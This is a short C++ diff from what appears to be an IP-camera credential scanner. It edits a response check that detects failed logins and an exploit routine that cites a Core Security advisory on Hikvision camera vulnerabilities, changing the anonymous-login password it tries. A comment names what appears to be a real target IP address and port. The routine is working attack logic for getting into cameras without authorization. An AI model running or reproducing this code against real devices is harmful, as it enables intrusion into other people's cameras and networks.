@@ -11,6 +11,7 @@ int BA::checkOutput(const string *buffer, const char *ip, const int port) {
 			&& Utils::ustrstr(*buffer, "<statusString>Unauthorized</statusString>") == -1
 			&& Utils::ustrstr(*buffer, "неправильны") == -1
 			&& Utils::ustrstr(*buffer, "РќРµРїСЂР°РІРёР»СЊРЅС‹") == -1
+			&& Utils::ustrstr(*buffer, "code: \"401\"") == -1 //77.51.196.31:81
             ) {
         return 1;
 	}
@@ -38,7 +39,8 @@ int BA::checkOutput(const string *buffer, const char *ip, const int port) {
 
 //http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
 inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode) {
-	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
+	//std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");
+	std::string lpString = string("anonymous") + ":" + string("123");
 
 	string buffer;
 	int res = Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
